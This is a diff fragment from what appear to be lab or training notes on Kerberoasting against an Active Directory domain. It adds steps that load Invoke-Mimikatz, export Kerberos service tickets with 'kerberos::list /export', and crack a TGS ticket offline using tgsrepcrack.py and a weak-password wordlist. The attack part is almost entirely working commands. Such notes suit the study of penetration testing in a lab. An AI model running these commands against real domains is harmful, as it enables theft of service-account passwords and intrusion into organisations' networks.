@@ -114,11 +114,17 @@ Kerberoasting
 
    "ops/research.SECURITY.local:1434" = SPN
 
+3. Use mimikatz to export kerberos ticket
+
+   C:> . .\Invoke-Mimikatz.ps1
+   C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
+   C:> ls | select name
 
 
-3. Crack the password from the TGS ticket using Tgsrepcrack 
+4. Crack the password from the TGS ticket using Tgsrepcrack 
 
-
+  C:\tools> python.exe .\kerberoast-python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a100-student@ops~research (TGS) 
+_______________________________________________________________________________________________________________________________________________________________________________________________
 
 
 
